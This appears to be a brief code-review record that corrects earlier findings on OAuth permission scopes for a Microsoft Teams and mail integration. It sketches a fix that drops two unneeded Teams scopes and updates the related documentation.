reviews.correction: The scope findings are real, with these caveats. (1) Teams scopes are requested only on explicit Teams opt-in (&teams=1, integrations.py:355-363, 450-461), not on every connect. (2) Admin Mail.Read is not unused. It powers the admin-mailbox indexing fallback in cloud_sync, so the problem is privacy/leak semantics rather than over-breadth, and removing it is a product call. (3) The sign-in offline_access/User.Read issue is cosmetic (User.Read is effectively implied by openid/profile consent). (4) The auth.py line numbers have drifted to 1343 and 1391.
reviews.fix_sketch: Remove Chat.ReadWrite and TeamsActivity.Send from TEAMS_REQUIRED_SCOPES and TEAMS_CONNECT_SCOPES. Existing credentials are a superset, so the gate stays green. Update frontend/src/marketing/integration-scopes.json and the Teams admin guide.
